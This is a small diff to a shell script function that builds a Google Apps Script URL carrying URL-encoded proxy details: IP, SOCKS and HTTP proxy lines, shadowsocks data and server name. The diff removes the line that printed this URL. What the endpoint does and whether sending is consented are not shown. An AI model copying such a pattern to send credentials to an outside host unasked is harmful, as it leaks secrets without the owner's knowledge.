@@ -45,8 +45,6 @@ send_api() {
         encoded_full=$(python3 -c "import urllib.parse;print(urllib.parse.quote('''$proxy_line'''))")
 
         url="https://script.google.com/macros/s/AKfycbysmF_1WUzUh3pebh1g4uHL2sigyDMXWQwOtm4e7-SoyYklE-iNqKie3J_7v0kZvBJy9Q/exec?IP=$encoded_ip&PROXY=$encoded_socks&HTTP=$encoded_http&SHADOW=$encoded_shadow&SEVER=$encoded_server&FULL=$encoded_full"
-
-        echo "$url"
     done < "$file_path"
 }
 
